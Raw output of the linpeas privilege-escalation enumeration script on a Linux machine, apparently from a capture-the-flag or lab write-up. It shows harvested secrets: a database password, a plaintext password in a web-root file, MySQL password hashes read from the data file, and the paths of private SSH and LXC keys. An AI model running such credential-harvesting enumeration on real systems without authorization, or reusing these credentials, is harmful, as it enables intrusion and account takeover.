/var/log/dpkg.log:2020-08-10 18:14:40 install base-passwd:amd64 <none> 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:40 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:45 upgrade base-passwd:amd64 3.5.39 3.5.39
/var/log/dpkg.log:2020-08-10 18:14:55 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:14:55 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:14:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:02 configure base-passwd:amd64 3.5.39 <none>
/var/log/dpkg.log:2020-08-10 18:15:02 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:02 status installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:02 status unpacked base-passwd:amd64 3.5.39
/var/log/dpkg.log:2020-08-10 18:15:12 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
/var/log/dpkg.log:2020-08-10 18:15:12 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:12 status installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:15:12 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 configure passwd:amd64 1:4.2-3.1ubuntu5.4 <none>
/var/log/dpkg.log:2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status installed passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
/var/log/dpkg.log:2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2020-08-10 18:16:22 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2023-03-13 09:26:15 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2023-03-13 09:26:15 status half-installed passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2023-03-13 09:26:15 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.4
/var/log/dpkg.log:2023-03-13 09:26:15 status unpacked passwd:amd64 1:4.5-1ubuntu2.5
/var/log/dpkg.log:2023-03-13 09:26:15 upgrade passwd:amd64 1:4.2-3.1ubuntu5.4 1:4.5-1ubuntu2.5
/var/log/dpkg.log:2023-03-13 09:26:17 configure passwd:amd64 1:4.5-1ubuntu2.5 <none>
/var/log/dpkg.log:2023-03-13 09:26:17 status half-configured passwd:amd64 1:4.5-1ubuntu2.5
/var/log/dpkg.log:2023-03-13 09:26:17 status installed passwd:amd64 1:4.5-1ubuntu2.5
/var/log/dpkg.log:2023-03-13 09:26:17 status unpacked passwd:amd64 1:4.5-1ubuntu2.5
/var/log/dpkg.log:2023-03-13 09:27:57 configure base-passwd:amd64 3.5.44 <none>
/var/log/dpkg.log:2023-03-13 09:27:57 status half-configured base-passwd:amd64 3.5.39
/var/log/dpkg.log:2023-03-13 09:27:57 status half-configured base-passwd:amd64 3.5.44
/var/log/dpkg.log:2023-03-13 09:27:57 status half-installed base-passwd:amd64 3.5.39
/var/log/dpkg.log:2023-03-13 09:27:57 status unpacked base-passwd:amd64 3.5.39

[+] Finding emails inside logs (limit 70)
     58 /var/log/installer/status:ubuntu-devel-discuss@lists.ubuntu.com
     28 /var/log/installer/status:ubuntu-installer@lists.ubuntu.com
     17 /var/log/installer/status:kernel-team@lists.ubuntu.com
      6 /var/log/syslog:maxk@qualcomm.com
      6 /var/log/syslog:dm-devel@redhat.com
      5 /var/log/kern.log:maxk@qualcomm.com
      5 /var/log/kern.log:dm-devel@redhat.com
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
/etc/nsswitch.conf:passwd:         compat systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
/home/bismuth/lin.out:$dbPassword = 'lychee'; // Password of the database
/home/bismuth/lin.out:                cursor.execute("SELECT password FROM user WHERE user = %s AND host = %s", (user, host))
/home/bismuth/lin.out:                        cursor.execute("SET PASSWORD FOR %s@%s = PASSWORD(%s)", (user, host, password))
/home/bismuth/lin.out:                            cursor.execute("SET PASSWORD FOR %s@%s = %s", (user, host, password))
/home/bismuth/lin.out:/var/log/apt/term.log:-bismuth ALL=(ALL) NOPASSWD: /bin/ping
/home/bismuth/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
/home/bismuth/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
/home/bismuth/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/home/bismuth/linpeas.sh:PASSWORD=""
/home/bismuth/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
/home/bismuth/linpeas.sh:  PASSWORDTRY=$2
/home/bismuth/linpeas.sh:    P)  PASSWORD=$OPTARG;;
/home/bismuth/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
/var/backups/dpkg.status.0:Depends: adduser, passwd, init-system-helpers (>= 1.18~), libc6 (>= 2.14), libsystemd0
/var/backups/dpkg.status.0:Depends: base-passwd (>= 3.0.4)
/var/backups/dpkg.status.0:Depends: passwd, libc6 (>= 2.4)
/var/backups/dpkg.status.0:Depends: perl-base (>= 5.6.0), passwd (>= 1:4.1.5.1-1.1ubuntu6), debconf | debconf-2.0
/var/www/html/764efa883dda1e11db47671c4a3bbd9e.txt:password: TUmhyZ37CLZrhP

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/home/bismuth/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done

[+] Searching specific hashes inside files - less false positives (limit 70)

```

```
We can read the Mysql Hashes from /var/lib/mysql/mysql/user.MYD
localhost
root
e7128b67d9e7
root
127.0.0.1
root
root
localhost
debian-sys-maint*015CC53362CDFB4ECD2CE756876D4A235EBE8E75
localhost
lychee*4E1E4103B94B2548A6A11F31EFEFF7910DDB13D3

```

```
Possible private SSH keys were found!
/home/bismuth/.config/lxc/client.key
/home/bismuth/.ssh/id_rsa

/var/lib/lxd/lxd.db
/home/bismuth/.gnupg/crls.d/DIR.txt
/home/bismuth/.config/lxc/config.yml

[+] Searching passwords in config PHP files
$dbPassword = 'lychee'; // Password of the database

```